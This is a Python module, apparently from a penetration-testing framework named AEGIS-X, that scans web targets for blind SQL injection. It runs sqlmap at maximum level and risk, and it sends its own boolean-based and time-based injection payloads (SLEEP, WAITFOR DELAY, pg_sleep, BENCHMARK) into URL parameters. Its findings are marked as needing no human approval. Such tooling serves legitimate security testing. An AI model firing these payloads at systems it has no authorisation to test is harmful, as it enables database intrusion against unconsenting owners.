"""
AEGIS-X Blind SQL Injection Scanner
Algorithm: Boolean-based differential + Time-based blind injection.
Tools: sqlmap --technique=BT (primary), custom binary search (fallback)
"""
import time
from aegisx.core import http_client as requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode

from aegisx.core.orchestration.command_gateway import CommandGateway
from aegisx.core.ui.console import ConsoleUI


class BlindSQLInjectionScanner:

    BOOL_TRUE = ["1 AND 1=1", "1' AND '1'='1", "1\" AND \"1\"=\"1", "1 AND 1=1--"]
    BOOL_FALSE = ["1 AND 1=2", "1' AND '1'='2", "1\" AND \"1\"=\"2", "1 AND 1=2--"]

    TIME_PAYLOADS = [
        "1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT SLEEP(5))--", "1 AND pg_sleep(5)--",
        "1'; WAITFOR DELAY '0:0:5'--", "1' AND BENCHMARK(10000000,SHA1('a'))--",
    ]

    def scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []

        # sqlmap blind-specific scan
        sqlmap_findings = self._run_sqlmap_blind(target, routes)
        findings.extend(sqlmap_findings)

        # Custom boolean-based
        bool_findings = self._boolean_blind_scan(target, routes)
        findings.extend(bool_findings)

        # Custom time-based
        time_findings = self._time_blind_scan(target, routes)
        findings.extend(time_findings)

        return findings

    def _run_sqlmap_blind(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"
        param_urls = [f"{base_url}{r}" if r.startswith("/") else r for r in routes if "?" in r or "=" in r]
        if not param_urls:
            param_urls = [base_url]

        for url in param_urls[:2]:
            cmd = ["sqlmap", "-u", url, "--batch", "--technique=BT",
                   "--level", "5", "--risk", "3", "--threads", "4",
                   "-v", "0", "--timeout", "15"]
            ConsoleUI.info(f"[SQLi-Blind] sqlmap blind scan: {url}")
            result = CommandGateway.execute(cmd, timeout=300, description="Blind SQL Injection (SQLMap)")
            stdout = result.get("stdout", "") or ""
            if "is vulnerable" in stdout or "injection point" in stdout:
                technique = "time-based" if "time-based" in stdout.lower() else "boolean-based"
                findings.append({
                    "finding_type": f"SQL Injection (Blind {technique.title()}) - SQLMap",
                    "base_confidence": 0.98, "consensus_score": 0.98, "score_conflict": False,
                    "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                    "requires_human_approval": False,
                    "recommended_validation": [
                        "Use parameterized queries / prepared statements",
                        "Implement WAF rules for blind SQLi patterns",
                    ],
                    "reasoning": [f"SQLMap confirmed blind {technique} injection at: {url}", stdout[:500]],
                    "nodes": [], "edges": [],
                })
        return findings

    def _boolean_blind_scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"

        for route in routes:
            url = f"{base_url}{route}" if route.startswith("/") else route
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for pname in list(params.keys())[:5]:
                burl = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                for i in range(len(self.BOOL_TRUE)):
                    tp_true = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    tp_false = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    tp_true[pname] = self.BOOL_TRUE[i]
                    tp_false[pname] = self.BOOL_FALSE[i]

                    try:
                        resp_true = requests.get(f"{burl}?{urlencode(tp_true)}", timeout=5)
                        resp_false = requests.get(f"{burl}?{urlencode(tp_false)}", timeout=5)
                        resp_base = requests.get(url, timeout=5)

                        # Boolean differential: TRUE matches baseline, FALSE differs
                        true_match = abs(len(resp_true.text) - len(resp_base.text)) < 50
                        false_diff = abs(len(resp_false.text) - len(resp_base.text)) > 50

                        if true_match and false_diff:
                            ConsoleUI.success(f"[SQLi-Blind] Boolean-based blind injection: {pname}")
                            findings.append({
                                "finding_type": "SQL Injection (Blind Boolean-Based)",
                                "base_confidence": 0.88, "consensus_score": 0.88, "score_conflict": False,
                                "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                                "requires_human_approval": False,
                                "recommended_validation": ["Use parameterized queries"],
                                "reasoning": [
                                    f"Boolean differential detected on '{pname}'",
                                    f"TRUE payload response ≈ baseline, FALSE payload differs by {abs(len(resp_false.text) - len(resp_base.text))} bytes",
                                ],
                                "nodes": [], "edges": [],
                            })
                            return findings
                    except requests.BudgetExhaustedError:
                        raise
                    except Exception:
                        pass
        return findings

    def _time_blind_scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"

        for route in routes:
            url = f"{base_url}{route}" if route.startswith("/") else route
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for pname in list(params.keys())[:5]:
                burl = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                try:
                    start = time.time()
                    requests.get(url, timeout=10)
                    baseline_time = time.time() - start
                except Exception:
                    continue

                for payload in self.TIME_PAYLOADS[:3]:
                    tp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    tp[pname] = payload
                    try:
                        start = time.time()
                        requests.get(f"{burl}?{urlencode(tp)}", timeout=15)
                        elapsed = time.time() - start
                        if elapsed - baseline_time > 4.0:
                            ConsoleUI.success(f"[SQLi-Blind] Time-based blind injection: {pname}")
                            findings.append({
                                "finding_type": "SQL Injection (Blind Time-Based)",
                                "base_confidence": 0.91, "consensus_score": 0.91, "score_conflict": False,
                                "risk_level": "CRITICAL", "governance_class": "ACTIVE_VALIDATION",
                                "requires_human_approval": False,
                                "recommended_validation": ["Use parameterized queries"],
                                "reasoning": [
                                    f"Time-based blind injection via '{pname}'",
                                    f"Payload: {payload}, delay: {elapsed-baseline_time:.1f}s",
                                ],
                                "nodes": [], "edges": [],
                            })
                            return findings
                    except requests.BudgetExhaustedError:
                        raise
                    except Exception:
                        pass
        return findings
